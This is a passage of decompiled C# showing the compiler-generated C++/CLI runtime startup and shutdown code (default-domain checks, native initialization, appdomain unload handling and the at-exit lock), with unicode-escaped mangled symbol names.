    \u003CModule\u003E.\u003FhasPerProcess\u0040DefaultDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u00400W4State\u0040TriBool\u00402\u0040A = (TriBool.State) 0;
    return false;
  }

  [return: MarshalAs(UnmanagedType.U1)]
  internal static unsafe bool \u003CCrtImplementationDetails\u003E\u002EDefaultDomain\u002EHasNative()
  {
    if (\u003CModule\u003E.\u003FhasNative\u0040DefaultDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u00400W4State\u0040TriBool\u00402\u0040A != (TriBool.State) 2)
      return \u003CModule\u003E.\u003FhasNative\u0040DefaultDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u00400W4State\u0040TriBool\u00402\u0040A == (TriBool.State) -1;
    void** voidPtr1 = (void**) &\u003CModule\u003E.__xi_a;
    if (ref \u003CModule\u003E.__xi_a < ref \u003CModule\u003E.__xi_z)
    {
      while (*(int*) voidPtr1 == 0)
      {
        voidPtr1 += 4;
        if ((IntPtr) voidPtr1 >= ref \u003CModule\u003E.__xi_z)
          goto label_5;
      }
      \u003CModule\u003E.\u003FhasNative\u0040DefaultDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u00400W4State\u0040TriBool\u00402\u0040A = (TriBool.State) -1;
      return true;
    }
label_5:
    void** voidPtr2 = (void**) &\u003CModule\u003E.__xc_a;
    if (ref \u003CModule\u003E.__xc_a < ref \u003CModule\u003E.__xc_z)
    {
      while (*(int*) voidPtr2 == 0)
      {
        voidPtr2 += 4;
        if ((IntPtr) voidPtr2 >= ref \u003CModule\u003E.__xc_z)
          goto label_9;
      }
      \u003CModule\u003E.\u003FhasNative\u0040DefaultDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u00400W4State\u0040TriBool\u00402\u0040A = (TriBool.State) -1;
      return true;
    }
label_9:
    \u003CModule\u003E.\u003FhasNative\u0040DefaultDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u00400W4State\u0040TriBool\u00402\u0040A = (TriBool.State) 0;
    return false;
  }

  [return: MarshalAs(UnmanagedType.U1)]
  internal static bool \u003CCrtImplementationDetails\u003E\u002EDefaultDomain\u002ENeedsInitialization() => \u003CModule\u003E.\u003CCrtImplementationDetails\u003E\u002EDefaultDomain\u002EHasPerProcess() && !\u003CModule\u003E.\u003FInitializedPerProcess\u0040DefaultDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u00402_NA || \u003CModule\u003E.\u003CCrtImplementationDetails\u003E\u002EDefaultDomain\u002EHasNative() && !\u003CModule\u003E.\u003FInitializedNative\u0040DefaultDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u00402_NA && \u003CModule\u003E.__native_startup_state == (__enative_startup_state) 0;

  [return: MarshalAs(UnmanagedType.U1)]
  internal static bool \u003CCrtImplementationDetails\u003E\u002EDefaultDomain\u002ENeedsUninitialization() => \u003CModule\u003E.\u003FEntered\u0040DefaultDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u00402_NA;

  internal static unsafe void \u003CCrtImplementationDetails\u003E\u002EDefaultDomain\u002EInitialize() => \u003CModule\u003E.\u003CCrtImplementationDetails\u003E\u002EDoCallBackInDefaultDomain((__FnPtr<int (void*)>) (IntPtr) \u003CModule\u003E.__unep\u0040\u003FDoNothing\u0040DefaultDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024FCGJPAX\u0040Z, (void*) 0);

  internal static void \u003FA0x250abb45\u002E\u003F\u003F__E\u003FInitialized\u0040CurrentDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q2HA\u0040\u0040YMXXZ() => \u003CModule\u003E.\u003FInitialized\u0040CurrentDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q2HA = 0;

  internal static void \u003FA0x250abb45\u002E\u003F\u003F__E\u003FUninitialized\u0040CurrentDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q2HA\u0040\u0040YMXXZ() => \u003CModule\u003E.\u003FUninitialized\u0040CurrentDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q2HA = 0;

  internal static void \u003FA0x250abb45\u002E\u003F\u003F__E\u003FIsDefaultDomain\u0040CurrentDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q2_NA\u0040\u0040YMXXZ() => \u003CModule\u003E.\u003FIsDefaultDomain\u0040CurrentDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q2_NA = false;

  internal static void \u003FA0x250abb45\u002E\u003F\u003F__E\u003FInitializedVtables\u0040CurrentDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q2W4State\u0040Progress\u00402\u0040A\u0040\u0040YMXXZ() => \u003CModule\u003E.\u003FInitializedVtables\u0040CurrentDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q2W4State\u0040Progress\u00402\u0040A = (Progress.State) 0;

  internal static void \u003FA0x250abb45\u002E\u003F\u003F__E\u003FInitializedNative\u0040CurrentDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q2W4State\u0040Progress\u00402\u0040A\u0040\u0040YMXXZ() => \u003CModule\u003E.\u003FInitializedNative\u0040CurrentDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q2W4State\u0040Progress\u00402\u0040A = (Progress.State) 0;

  internal static void \u003FA0x250abb45\u002E\u003F\u003F__E\u003FInitializedPerProcess\u0040CurrentDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q2W4State\u0040Progress\u00402\u0040A\u0040\u0040YMXXZ() => \u003CModule\u003E.\u003FInitializedPerProcess\u0040CurrentDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q2W4State\u0040Progress\u00402\u0040A = (Progress.State) 0;

  internal static void \u003FA0x250abb45\u002E\u003F\u003F__E\u003FInitializedPerAppDomain\u0040CurrentDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q2W4State\u0040Progress\u00402\u0040A\u0040\u0040YMXXZ() => \u003CModule\u003E.\u003FInitializedPerAppDomain\u0040CurrentDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q2W4State\u0040Progress\u00402\u0040A = (Progress.State) 0;

  [DebuggerStepThrough]
  internal static unsafe void \u003CCrtImplementationDetails\u003E\u002ELanguageSupport\u002EInitializeVtables(
    [In] LanguageSupport* obj0)
  {
    \u003CModule\u003E.gcroot\u003CSystem\u003A\u003AString\u0020\u005E\u003E\u002E\u003D((gcroot\u003CSystem\u003A\u003AString\u0020\u005E\u003E*) obj0, "The C++ module failed to load during vtable initialization.\n");
    \u003CModule\u003E.\u003FInitializedVtables\u0040CurrentDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q2W4State\u0040Progress\u00402\u0040A = (Progress.State) 1;
    \u003CModule\u003E._initterm_m((__FnPtr<void* ()>*) &\u003CModule\u003E.\u003FA0x250abb45\u002E__xi_vt_a, (__FnPtr<void* ()>*) &\u003CModule\u003E.\u003FA0x250abb45\u002E__xi_vt_z);
    \u003CModule\u003E.\u003FInitializedVtables\u0040CurrentDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q2W4State\u0040Progress\u00402\u0040A = (Progress.State) 2;
  }

  internal static unsafe void \u003CCrtImplementationDetails\u003E\u002ELanguageSupport\u002EInitializeDefaultAppDomain(
    [In] LanguageSupport* obj0)
  {
    \u003CModule\u003E.gcroot\u003CSystem\u003A\u003AString\u0020\u005E\u003E\u002E\u003D((gcroot\u003CSystem\u003A\u003AString\u0020\u005E\u003E*) obj0, "The C++ module failed to load while attempting to initialize the default appdomain.\n");
    \u003CModule\u003E.\u003CCrtImplementationDetails\u003E\u002EDefaultDomain\u002EInitialize();
  }

  [DebuggerStepThrough]
  internal static unsafe void \u003CCrtImplementationDetails\u003E\u002ELanguageSupport\u002EInitializeNative(
    [In] LanguageSupport* obj0)
  {
    \u003CModule\u003E.gcroot\u003CSystem\u003A\u003AString\u0020\u005E\u003E\u002E\u003D((gcroot\u003CSystem\u003A\u003AString\u0020\u005E\u003E*) obj0, "The C++ module failed to load during native initialization.\n");
    \u003CModule\u003E.__security_init_cookie();
    \u003CModule\u003E.\u003FInitializedNative\u0040DefaultDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u00402_NA = true;
    if (!\u003CModule\u003E.\u003CCrtImplementationDetails\u003E\u002ENativeDll\u002EIsSafeForManagedCode())
      \u003CModule\u003E._amsg_exit(33);
    switch (\u003CModule\u003E.__native_startup_state)
    {
      case (__enative_startup_state) 0:
        \u003CModule\u003E.\u003FInitializedNative\u0040CurrentDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q2W4State\u0040Progress\u00402\u0040A = (Progress.State) 1;
        \u003CModule\u003E.__native_startup_state = (__enative_startup_state) 1;
        if (\u003CModule\u003E._initterm_e((__FnPtr<int ()>*) &\u003CModule\u003E.__xi_a, (__FnPtr<int ()>*) &\u003CModule\u003E.__xi_z) != 0)
          \u003CModule\u003E.\u003CCrtImplementationDetails\u003E\u002EThrowModuleLoadException(\u003CModule\u003E.gcroot\u003CSystem\u003A\u003AString\u0020\u005E\u003E\u002E\u002EP\u0024AAVString\u0040System\u0040\u0040((gcroot\u003CSystem\u003A\u003AString\u0020\u005E\u003E*) obj0));
        \u003CModule\u003E._initterm((__FnPtr<void ()>*) &\u003CModule\u003E.__xc_a, (__FnPtr<void ()>*) &\u003CModule\u003E.__xc_z);
        \u003CModule\u003E.__native_startup_state = (__enative_startup_state) 2;
        \u003CModule\u003E.\u003FInitializedNativeFromCCTOR\u0040DefaultDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u00402_NA = true;
        \u003CModule\u003E.\u003FInitializedNative\u0040CurrentDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q2W4State\u0040Progress\u00402\u0040A = (Progress.State) 2;
        break;
      case (__enative_startup_state) 1:
        \u003CModule\u003E._amsg_exit(33);
        break;
    }
  }

  [DebuggerStepThrough]
  internal static unsafe void \u003CCrtImplementationDetails\u003E\u002ELanguageSupport\u002EInitializePerProcess(
    [In] LanguageSupport* obj0)
  {
    \u003CModule\u003E.gcroot\u003CSystem\u003A\u003AString\u0020\u005E\u003E\u002E\u003D((gcroot\u003CSystem\u003A\u003AString\u0020\u005E\u003E*) obj0, "The C++ module failed to load during process initialization.\n");
    \u003CModule\u003E.\u003FInitializedPerProcess\u0040CurrentDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q2W4State\u0040Progress\u00402\u0040A = (Progress.State) 1;
    \u003CModule\u003E._initatexit_m();
    \u003CModule\u003E._initterm_m((__FnPtr<void* ()>*) &\u003CModule\u003E.\u003FA0x250abb45\u002E__xc_mp_a, (__FnPtr<void* ()>*) &\u003CModule\u003E.\u003FA0x250abb45\u002E__xc_mp_z);
    \u003CModule\u003E.\u003FInitializedPerProcess\u0040CurrentDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q2W4State\u0040Progress\u00402\u0040A = (Progress.State) 2;
    \u003CModule\u003E.\u003FInitializedPerProcess\u0040DefaultDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u00402_NA = true;
  }

  [DebuggerStepThrough]
  internal static unsafe void \u003CCrtImplementationDetails\u003E\u002ELanguageSupport\u002EInitializePerAppDomain(
    [In] LanguageSupport* obj0)
  {
    \u003CModule\u003E.gcroot\u003CSystem\u003A\u003AString\u0020\u005E\u003E\u002E\u003D((gcroot\u003CSystem\u003A\u003AString\u0020\u005E\u003E*) obj0, "The C++ module failed to load during appdomain initialization.\n");
    \u003CModule\u003E.\u003FInitializedPerAppDomain\u0040CurrentDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q2W4State\u0040Progress\u00402\u0040A = (Progress.State) 1;
    \u003CModule\u003E._initatexit_app_domain();
    \u003CModule\u003E._initterm_m((__FnPtr<void* ()>*) &\u003CModule\u003E.\u003FA0x250abb45\u002E__xc_ma_a, (__FnPtr<void* ()>*) &\u003CModule\u003E.\u003FA0x250abb45\u002E__xc_ma_z);
    \u003CModule\u003E.\u003FInitializedPerAppDomain\u0040CurrentDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q2W4State\u0040Progress\u00402\u0040A = (Progress.State) 2;
  }

  [DebuggerStepThrough]
  internal static unsafe void \u003CCrtImplementationDetails\u003E\u002ELanguageSupport\u002EInitializeUninitializer(
    [In] LanguageSupport* obj0)
  {
    \u003CModule\u003E.gcroot\u003CSystem\u003A\u003AString\u0020\u005E\u003E\u002E\u003D((gcroot\u003CSystem\u003A\u003AString\u0020\u005E\u003E*) obj0, "The C++ module failed to load during registration for the unload events.\n");
    \u003CModule\u003E.\u003CCrtImplementationDetails\u003E\u002ERegisterModuleUninitializer(new EventHandler(\u003CModule\u003E.\u003CCrtImplementationDetails\u003E\u002ELanguageSupport\u002EDomainUnload));
  }

  [ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
  [DebuggerStepThrough]
  internal static unsafe void \u003CCrtImplementationDetails\u003E\u002ELanguageSupport\u002E_Initialize(
    [In] LanguageSupport* obj0)
  {
    \u003CModule\u003E.\u003FIsDefaultDomain\u0040CurrentDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q2_NA = AppDomain.CurrentDomain.IsDefaultAppDomain();
    if (\u003CModule\u003E.\u003FIsDefaultDomain\u0040CurrentDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q2_NA)
      \u003CModule\u003E.\u003FEntered\u0040DefaultDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u00402_NA = true;
    \u003CModule\u003E.\u003CCrtImplementationDetails\u003E\u002EDoDllLanguageSupportValidation();
    void* fiberPtrId = \u003CModule\u003E._getFiberPtrId();
    int num1 = 0;
    int num2 = 0;
    int num3 = 0;
    RuntimeHelpers.PrepareConstrainedRegions();
    try
    {
      while (num2 == 0)
      {
        try
        {
        }
        finally
        {
          IntPtr comparand = (IntPtr) 0;
          IntPtr num4 = (IntPtr) fiberPtrId;
          // ISSUE: cast to a reference type
          void* voidPtr = (void*) Interlocked.CompareExchange((IntPtr&) ref \u003CModule\u003E.__native_startup_lock, num4, comparand);
          if ((IntPtr) voidPtr == IntPtr.Zero)
            num2 = 1;
          else if (voidPtr == fiberPtrId)
          {
            num1 = 1;
            num2 = 1;
          }
        }
        if (num2 == 0)
          \u003CModule\u003E.Sleep(1000U);
      }
      \u003CModule\u003E.\u003CCrtImplementationDetails\u003E\u002ELanguageSupport\u002EInitializeVtables(obj0);
      if (\u003CModule\u003E.\u003FIsDefaultDomain\u0040CurrentDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q2_NA)
      {
        \u003CModule\u003E.\u003CCrtImplementationDetails\u003E\u002ELanguageSupport\u002EInitializeNative(obj0);
        \u003CModule\u003E.\u003CCrtImplementationDetails\u003E\u002ELanguageSupport\u002EInitializePerProcess(obj0);
      }
      else if (\u003CModule\u003E.\u003CCrtImplementationDetails\u003E\u002EDefaultDomain\u002ENeedsInitialization())
        num3 = 1;
    }
    finally
    {
      if (num1 == 0)
      {
        IntPtr num5 = (IntPtr) 0;
        // ISSUE: cast to a reference type
        Interlocked.Exchange((IntPtr&) ref \u003CModule\u003E.__native_startup_lock, num5);
      }
    }
    if (num3 != 0)
      \u003CModule\u003E.\u003CCrtImplementationDetails\u003E\u002ELanguageSupport\u002EInitializeDefaultAppDomain(obj0);
    \u003CModule\u003E.\u003CCrtImplementationDetails\u003E\u002ELanguageSupport\u002EInitializePerAppDomain(obj0);
    \u003CModule\u003E.\u003FInitialized\u0040CurrentDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q2HA = 1;
    \u003CModule\u003E.\u003CCrtImplementationDetails\u003E\u002ELanguageSupport\u002EInitializeUninitializer(obj0);
  }

  internal static void \u003CCrtImplementationDetails\u003E\u002ELanguageSupport\u002EUninitializeAppDomain() => \u003CModule\u003E._app_exit_callback();

  internal static unsafe int \u003CCrtImplementationDetails\u003E\u002ELanguageSupport\u002E_UninitializeDefaultDomain(
    void* cookie)
  {
    \u003CModule\u003E._exit_callback();
    \u003CModule\u003E.\u003FInitializedPerProcess\u0040DefaultDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u00402_NA = false;
    if (\u003CModule\u003E.\u003FInitializedNativeFromCCTOR\u0040DefaultDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u00402_NA)
    {
      \u003CModule\u003E._cexit();
      \u003CModule\u003E.__native_startup_state = (__enative_startup_state) 0;
      \u003CModule\u003E.\u003FInitializedNativeFromCCTOR\u0040DefaultDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u00402_NA = false;
    }
    \u003CModule\u003E.\u003FInitializedNative\u0040DefaultDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u00402_NA = false;
    return 0;
  }

  internal static unsafe void \u003CCrtImplementationDetails\u003E\u002ELanguageSupport\u002EUninitializeDefaultDomain()
  {
    if (!\u003CModule\u003E.\u003FEntered\u0040DefaultDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u00402_NA)
      return;
    if (AppDomain.CurrentDomain.IsDefaultAppDomain())
    {
      \u003CModule\u003E.\u003CCrtImplementationDetails\u003E\u002ELanguageSupport\u002E_UninitializeDefaultDomain((void*) 0);
    }
    else
    {
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.\u003CCrtImplementationDetails\u003E\u002EDoCallBackInDefaultDomain((__FnPtr<int (void*)>) (IntPtr) \u003CModule\u003E.__unep\u0040\u003F_UninitializeDefaultDomain\u0040LanguageSupport\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024FCGJPAX\u0040Z, (void*) 0);
    }
  }

  [PrePrepareMethod]
  [ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
  internal static void \u003CCrtImplementationDetails\u003E\u002ELanguageSupport\u002EDomainUnload(
    object source,
    EventArgs arguments)
  {
    if (\u003CModule\u003E.\u003FInitialized\u0040CurrentDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q2HA == 0 || Interlocked.Exchange(ref \u003CModule\u003E.\u003FUninitialized\u0040CurrentDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q2HA, 1) != 0)
      return;
    int num = Interlocked.Decrement(ref \u003CModule\u003E.\u003FCount\u0040AllDomains\u0040\u003CCrtImplementationDetails\u003E\u0040\u00402HA) == 0 ? 1 : 0;
    \u003CModule\u003E._app_exit_callback();
    if ((byte) num == (byte) 0)
      return;
    \u003CModule\u003E.\u003CCrtImplementationDetails\u003E\u002ELanguageSupport\u002EUninitializeDefaultDomain();
  }

  [DebuggerStepThrough]
  [ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
  internal static unsafe void \u003CCrtImplementationDetails\u003E\u002ELanguageSupport\u002ECleanup(
    [In] LanguageSupport* obj0,
    Exception innerException)
  {
    try
    {
      bool flag = Interlocked.Decrement(ref \u003CModule\u003E.\u003FCount\u0040AllDomains\u0040\u003CCrtImplementationDetails\u003E\u0040\u00402HA) == 0;
      \u003CModule\u003E.\u003CCrtImplementationDetails\u003E\u002ELanguageSupport\u002EUninitializeAppDomain();
      if (!flag)
        return;
      \u003CModule\u003E.\u003CCrtImplementationDetails\u003E\u002ELanguageSupport\u002EUninitializeDefaultDomain();
    }
    catch (Exception ex)
    {
      \u003CModule\u003E.\u003CCrtImplementationDetails\u003E\u002EThrowNestedModuleLoadException(innerException, ex);
    }
    catch
    {
      \u003CModule\u003E.\u003CCrtImplementationDetails\u003E\u002EThrowNestedModuleLoadException(innerException, (Exception) null);
    }
  }

  [DebuggerStepThrough]
  [ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
  internal static unsafe void \u003CCrtImplementationDetails\u003E\u002ELanguageSupport\u002EInitialize(
    [In] LanguageSupport* obj0)
  {
    bool flag = false;
    RuntimeHelpers.PrepareConstrainedRegions();
    try
    {
      \u003CModule\u003E.gcroot\u003CSystem\u003A\u003AString\u0020\u005E\u003E\u002E\u003D((gcroot\u003CSystem\u003A\u003AString\u0020\u005E\u003E*) obj0, "The C++ module failed to load.\n");
      RuntimeHelpers.PrepareConstrainedRegions();
      try
      {
      }
      finally
      {
        Interlocked.Increment(ref \u003CModule\u003E.\u003FCount\u0040AllDomains\u0040\u003CCrtImplementationDetails\u003E\u0040\u00402HA);
        flag = true;
      }
      \u003CModule\u003E.\u003CCrtImplementationDetails\u003E\u002ELanguageSupport\u002E_Initialize(obj0);
    }
    catch (Exception ex)
    {
      if (flag)
        \u003CModule\u003E.\u003CCrtImplementationDetails\u003E\u002ELanguageSupport\u002ECleanup(obj0, ex);
      \u003CModule\u003E.\u003CCrtImplementationDetails\u003E\u002EThrowModuleLoadException(\u003CModule\u003E.gcroot\u003CSystem\u003A\u003AString\u0020\u005E\u003E\u002E\u002EP\u0024AAVString\u0040System\u0040\u0040((gcroot\u003CSystem\u003A\u003AString\u0020\u005E\u003E*) obj0), ex);
    }
    catch
    {
      if (flag)
        \u003CModule\u003E.\u003CCrtImplementationDetails\u003E\u002ELanguageSupport\u002ECleanup(obj0, (Exception) null);
      \u003CModule\u003E.\u003CCrtImplementationDetails\u003E\u002EThrowModuleLoadException(\u003CModule\u003E.gcroot\u003CSystem\u003A\u003AString\u0020\u005E\u003E\u002E\u002EP\u0024AAVString\u0040System\u0040\u0040((gcroot\u003CSystem\u003A\u003AString\u0020\u005E\u003E*) obj0), (Exception) null);
    }
  }

  [DebuggerStepThrough]
  static unsafe \u003CModule\u003E()
  {
    LanguageSupport languageSupport;
    \u003CModule\u003E.\u003CCrtImplementationDetails\u003E\u002ELanguageSupport\u002E\u007Bctor\u007D(&languageSupport);
    // ISSUE: fault handler
    try
    {
      \u003CModule\u003E.\u003CCrtImplementationDetails\u003E\u002ELanguageSupport\u002EInitialize(&languageSupport);
    }
    __fault
    {
      // ISSUE: method pointer
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(\u003CCrtImplementationDetails\u003E\u002ELanguageSupport\u002E\u007Bdtor\u007D), (void*) &languageSupport);
    }
    \u003CModule\u003E.gcroot\u003CSystem\u003A\u003AString\u0020\u005E\u003E\u002E\u007Bdtor\u007D((gcroot\u003CSystem\u003A\u003AString\u0020\u005E\u003E*) &languageSupport);
  }

  internal static unsafe LanguageSupport* \u003CCrtImplementationDetails\u003E\u002ELanguageSupport\u002E\u007Bctor\u007D(
    [In] LanguageSupport* obj0)
  {
    \u003CModule\u003E.gcroot\u003CSystem\u003A\u003AString\u0020\u005E\u003E\u002E\u007Bctor\u007D((gcroot\u003CSystem\u003A\u003AString\u0020\u005E\u003E*) obj0);
    return obj0;
  }

  internal static unsafe void \u003CCrtImplementationDetails\u003E\u002ELanguageSupport\u002E\u007Bdtor\u007D(
    [In] LanguageSupport* obj0)
  {
    \u003CModule\u003E.gcroot\u003CSystem\u003A\u003AString\u0020\u005E\u003E\u002E\u007Bdtor\u007D((gcroot\u003CSystem\u003A\u003AString\u0020\u005E\u003E*) obj0);
  }

  [DebuggerStepThrough]
  internal static unsafe gcroot\u003CSystem\u003A\u003AString\u0020\u005E\u003E* gcroot\u003CSystem\u003A\u003AString\u0020\u005E\u003E\u002E\u007Bctor\u007D(
    [In] gcroot\u003CSystem\u003A\u003AString\u0020\u005E\u003E* obj0)
  {
    IntPtr num = (IntPtr) GCHandle.Alloc((object) null);
    *(int*) obj0 = (int) num.ToPointer();
    return obj0;
  }

  [DebuggerStepThrough]
  internal static unsafe void gcroot\u003CSystem\u003A\u003AString\u0020\u005E\u003E\u002E\u007Bdtor\u007D(
    [In] gcroot\u003CSystem\u003A\u003AString\u0020\u005E\u003E* obj0)
  {
    ((GCHandle) new IntPtr((void*) *(int*) obj0)).Free();
    *(int*) obj0 = 0;
  }

  [DebuggerStepThrough]
  internal static unsafe gcroot\u003CSystem\u003A\u003AString\u0020\u005E\u003E* gcroot\u003CSystem\u003A\u003AString\u0020\u005E\u003E\u002E\u003D(
    [In] gcroot\u003CSystem\u003A\u003AString\u0020\u005E\u003E* obj0,
    string t)
  {
    ((GCHandle) new IntPtr((void*) *(int*) obj0)).Target = (object) t;
    return obj0;
  }

  internal static unsafe string gcroot\u003CSystem\u003A\u003AString\u0020\u005E\u003E\u002E\u002EP\u0024AAVString\u0040System\u0040\u0040(
    [In] gcroot\u003CSystem\u003A\u003AString\u0020\u005E\u003E* obj0)
  {
    return (string) ((GCHandle) new IntPtr((void*) *(int*) obj0)).Target;
  }

  [DebuggerStepThrough]
  internal static unsafe ValueType \u003CCrtImplementationDetails\u003E\u002EAtExitLock\u002E_handle() => (IntPtr) \u003CModule\u003E.\u003F_lock\u0040AtExitLock\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q0PAXA != IntPtr.Zero ? (ValueType) GCHandle.FromIntPtr(new IntPtr(\u003CModule\u003E.\u003F_lock\u0040AtExitLock\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q0PAXA)) : (ValueType) null;

  [DebuggerStepThrough]
  internal static unsafe void \u003CCrtImplementationDetails\u003E\u002EAtExitLock\u002E_lock_Construct(
    object value)
  {
    \u003CModule\u003E.\u003F_lock\u0040AtExitLock\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q0PAXA = (void*) 0;
    \u003CModule\u003E.\u003CCrtImplementationDetails\u003E\u002EAtExitLock\u002E_lock_Set(value);
  }

  [DebuggerStepThrough]
  internal static unsafe void \u003CCrtImplementationDetails\u003E\u002EAtExitLock\u002E_lock_Set(
    object value)
  {
    ValueType valueType = \u003CModule\u003E.\u003CCrtImplementationDetails\u003E\u002EAtExitLock\u002E_handle();
    if (valueType == null)
      \u003CModule\u003E.\u003F_lock\u0040AtExitLock\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q0PAXA = GCHandle.ToIntPtr(GCHandle.Alloc(value)).ToPointer();
    else
      ((GCHandle) valueType).Target = value;
  }

  [DebuggerStepThrough]
  internal static object \u003CCrtImplementationDetails\u003E\u002EAtExitLock\u002E_lock_Get()
  {
    ValueType valueType = \u003CModule\u003E.\u003CCrtImplementationDetails\u003E\u002EAtExitLock\u002E_handle();
    return valueType != null ? ((GCHandle) valueType).Target : (object) null;
  }

  [DebuggerStepThrough]
  internal static unsafe void \u003CCrtImplementationDetails\u003E\u002EAtExitLock\u002E_lock_Destruct()
  {
    ValueType valueType = \u003CModule\u003E.\u003CCrtImplementationDetails\u003E\u002EAtExitLock\u002E_handle();
    if (valueType == null)
      return;
    ((GCHandle) valueType).Free();
    \u003CModule\u003E.\u003F_lock\u0040AtExitLock\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q0PAXA = (void*) 0;
  }

  [DebuggerStepThrough]
  [return: MarshalAs(UnmanagedType.U1)]
  internal static bool \u003CCrtImplementationDetails\u003E\u002EAtExitLock\u002EIsInitialized() => \u003CModule\u003E.\u003CCrtImplementationDetails\u003E\u002EAtExitLock\u002E_lock_Get() != null;

  [DebuggerStepThrough]
  internal static unsafe void \u003CCrtImplementationDetails\u003E\u002EAtExitLock\u002EAddRef()
  {
    if (!\u003CModule\u003E.\u003CCrtImplementationDetails\u003E\u002EAtExitLock\u002EIsInitialized())
    {
      object obj = new object();
      \u003CModule\u003E.\u003F_lock\u0040AtExitLock\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q0PAXA = (void*) 0;
      \u003CModule\u003E.\u003CCrtImplementationDetails\u003E\u002EAtExitLock\u002E_lock_Set(obj);
      \u003CModule\u003E.\u003F_ref_count\u0040AtExitLock\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q0HA = 0;
    }
    ++\u003CModule\u003E.\u003F_ref_count\u0040AtExitLock\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q0HA;
  }

  [DebuggerStepThrough]
  internal static void \u003CCrtImplementationDetails\u003E\u002EAtExitLock\u002ERemoveRef()
  {
    --\u003CModule\u003E.\u003F_ref_count\u0040AtExitLock\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q0HA;
    if (\u003CModule\u003E.\u003F_ref_count\u0040AtExitLock\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q0HA != 0)
      return;
    \u003CModule\u003E.\u003CCrtImplementationDetails\u003E\u002EAtExitLock\u002E_lock_Destruct();
  }

  [DebuggerStepThrough]
  internal static void \u003CCrtImplementationDetails\u003E\u002EAtExitLock\u002EEnter() => Monitor.Enter(\u003CModule\u003E.\u003CCrtImplementationDetails\u003E\u002EAtExitLock\u002E_lock_Get());

  [DebuggerStepThrough]
  internal static void \u003CCrtImplementationDetails\u003E\u002EAtExitLock\u002EExit() => Monitor.Exit(\u003CModule\u003E.\u003CCrtImplementationDetails\u003E\u002EAtExitLock\u002E_lock_Get());

  [DebuggerStepThrough]
  [return: MarshalAs(UnmanagedType.U1)]
  internal static bool \u003FA0x11773762\u002E__global_lock()
  {
    bool flag = false;
    if (\u003CModule\u003E.\u003CCrtImplementationDetails\u003E\u002EAtExitLock\u002EIsInitialized())
    {
